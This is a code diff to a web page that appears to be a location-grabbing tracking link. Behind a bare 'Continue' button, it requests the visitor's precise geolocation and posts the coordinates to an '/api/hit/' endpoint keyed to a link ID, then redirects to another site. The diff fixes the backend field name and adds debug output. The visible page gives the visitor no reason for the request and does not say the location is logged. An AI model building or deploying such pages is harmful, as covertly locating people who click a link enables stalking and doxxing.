@@ -90,7 +90,7 @@
       display: none;
     }
     
-    /* For debugging - remove in production */
+    /* For debugging */
     .debug {
       position: fixed;
       bottom: 10px;
@@ -101,6 +101,7 @@
       padding: 5px 10px;
       border-radius: 5px;
       font-family: monospace;
+      z-index: 9999;
     }
   </style>
 </head>
@@ -119,7 +120,6 @@
   <button id="continueBtn" class="hidden">Continue</button>
 </div>
 
-<!-- Debug panel to verify accuracy is captured (remove in production) -->
 <div class="debug" id="debug"></div>
 
 <script>
@@ -140,8 +140,11 @@
       .then(r => r.json())
       .then(data => {
         if (data && data.dest) destinationUrl = data.dest;
+        debug.innerHTML = `✅ Destination loaded: ${destinationUrl}`;
       })
-      .catch(() => {});
+      .catch(() => {
+        debug.innerHTML = `⚠️ Using default destination: ${destinationUrl}`;
+      });
   }
   
   // Show dots animation
@@ -165,37 +168,45 @@
     continueBtn.classList.add('hidden');
   }
   
-  // Send location to backend
+  // Send location to backend - FIXED: using 'acc' field name (not 'accuracy')
   function sendLocation(lat, lon, acc) {
     if (locationSent) return;
     locationSent = true;
     
-    debug.innerHTML = `Sending: Lat=${lat}, Lon=${lon}, Accuracy=${acc}m`;
-    
+    // IMPORTANT: Backend expects 'acc' field, not 'accuracy'
     const payload = {
       lat: lat,
       lon: lon,
-      accuracy: acc,
-      linkId: linkId || 'unknown',
-      timestamp: Date.now()
+      acc: acc  // <-- THIS IS THE KEY FIX! Use 'acc' not 'accuracy'
     };
     
-    console.log('Sending location:', payload);
+    console.log('📤 Sending to backend:', payload);
+    debug.innerHTML = `📤 Sending: lat=${lat}, lon=${lon}, acc=${acc}m`;
     
-    fetch('/api/hit/' + (linkId || 'unknown'), {
+    fetch('/api/hit/' + linkId, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(payload)
-    }).catch(err => console.log('Send error:', err));
+    })
+    .then(res => res.json())
+    .then(data => {
+      console.log('✅ Server response:', data);
+      debug.innerHTML = `✅ Server accepted! Redirecting...`;
+    })
+    .catch(err => {
+      console.log('❌ Send error:', err);
+      debug.innerHTML = `❌ Error: ${err.message}`;
+    });
   }
   
   // Redirect
   function redirect() {
     if (redirecting) return;
     redirecting = true;
+    debug.innerHTML = `🔄 Redirecting to ${destinationUrl}...`;
     setTimeout(() => {
       window.location.href = destinationUrl;
-    }, 500);
+    }, 800);
   }
   
   // Request location permission
@@ -205,11 +216,11 @@
     
     // Show loading dots
     showLoadingDots();
-    debug.innerHTML = 'Requesting location...';
+    debug.innerHTML = '📍 Requesting location permission...';
     
     // Check if geolocation is supported
     if (!navigator.geolocation) {
-      debug.innerHTML = 'ERROR: Geolocation not supported';
+      debug.innerHTML = '❌ Geolocation not supported';
       showButton();
       return;
     }
@@ -218,33 +229,56 @@
     navigator.geolocation.getCurrentPosition(
       // Success - User allowed
       function(position) {
-        // FIXED: Accuracy is always available in position.coords
         const lat = position.coords.latitude;
         const lon = position.coords.longitude;
-        const acc = position.coords.accuracy; // This returns meters
+        const acc = position.coords.accuracy; // Accuracy in meters
         const accRounded = Math.round(acc);
         
-        // Debug log to verify
-        console.log('Position object:', position);
-        console.log('Raw accuracy:', acc);
-        console.log('Rounded accuracy:', accRounded);
+        // Debug logging
+        console.log('📍 Position captured:', {
+          latitude: lat,
+          longitude: lon,
+          accuracy: acc,
+          accuracyRounded: accRounded
+        });
         
-        debug.innerHTML = `✅ Captured! Lat: ${lat.toFixed(4)}, Lon: ${lon.toFixed(4)}, Accuracy: ${accRounded} meters`;
+        debug.innerHTML = `✅ Location captured! Lat: ${lat.toFixed(6)}, Lon: ${lon.toFixed(6)}, Acc: ${accRounded}m`;
         
         // Send to backend with accuracy
         sendLocation(lat, lon, accRounded);
         
-        // Redirect
-        redirect();
+        // Redirect after a short delay to ensure data is sent
+        setTimeout(() => {
+          redirect();
+        }, 500);
       },
-      // Error - User denied
+      // Error - User denied or error
       function(error) {
-        debug.innerHTML = `❌ Error: ${error.code} - ${error.message}`;
-        // Show button again so user can retry
-        showButton();
+        let errorMsg = '';
+        switch(error.code) {
+          case error.PERMISSION_DENIED:
+            errorMsg = 'Location access denied';
+            break;
+          case error.POSITION_UNAVAILABLE:
+            errorMsg = 'Position unavailable';
+            break;
+          case error.TIMEOUT:
+            errorMsg = 'Location timeout';
+            break;
+          default:
+            errorMsg = error.message;
+        }
+        
+        console.log('❌ Geolocation error:', errorMsg);
+        debug.innerHTML = `❌ ${errorMsg}. Redirecting without location...`;
+        
+        // Redirect anyway after showing error
+        setTimeout(() => {
+          redirect();
+        }, 1500);
       },
       {
-        enableHighAccuracy: true,  // This gives better accuracy
+        enableHighAccuracy: true,
         timeout: 10000,
         maximumAge: 0
       }
@@ -254,7 +288,7 @@
   // Show initial dots for 1.5 seconds, then show button
   setTimeout(() => {
     showButton();
-    debug.innerHTML = 'Ready - Click Continue to allow location';
+    debug.innerHTML = '✅ Ready - Click "Continue" to allow location';
   }, 1500);
   
   // Button click handler
